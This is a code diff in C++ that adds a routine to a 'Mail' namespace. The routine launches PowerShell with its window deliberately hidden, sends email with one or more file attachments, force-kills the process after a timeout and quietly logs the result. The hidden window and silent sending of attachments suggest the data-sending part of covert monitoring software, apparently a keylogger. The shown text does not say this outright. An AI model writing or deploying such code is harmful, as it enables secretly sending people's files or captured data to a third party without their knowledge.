@@ -120,7 +120,41 @@ namespace Mail
 		ShExecInfo.nShow = SW_HIDE; // hide powershell window
 		ShExecInfo.hInstApp = NULL;
 
+		ok = (bool)ShellExecuteEx(&ShExecInfo);
+		if (!ok) // check if was executed successfully
+			return -3;
+		// Wait for 7 seconds to see if mail was successfully sent
+		WaitForSingleObject(ShExecInfo.hProcess, 7000);
+		DWORD exit_code = 100; // arbitrary code to exit
+		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code); // check powershell status
 
+		m_timer.SetFunction([&]() // lambda function to access all variables from SendMail
+		{
+			WaitForSingleObject(ShExecInfo.hProcess, 60000); // wait for one minute
+			GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+			if ((int)exit_code == STILL_ACTIVE) // check powershell status
+				TerminateProcess(ShExecInfo.hProcess, 100);
+			Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
+		});
+
+		m_timer.RepeatCount(1L); // execute only once
+		m_timer.SetInterval(10L);
+		m_timer.Start(true); // asynchronous execute
+		return (int)exit_code;
+	}
+
+	int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att) // overload SendMail to send multiple attachments
+	{
+		std::string attachments = "";
+		if (att.size() == 1U) // check if only 1 attachment
+			attachments = att.at(0); // grab the first index only then
+		else
+		{
+			for (const auto &v : att)
+				attachments += v + "::"; // separate attachments with colons
+		}
+		attachments = attachments.substr(0, attachments.length() - 2);
+		return SendMail(subject, body, attachments);
 	}
 }
 
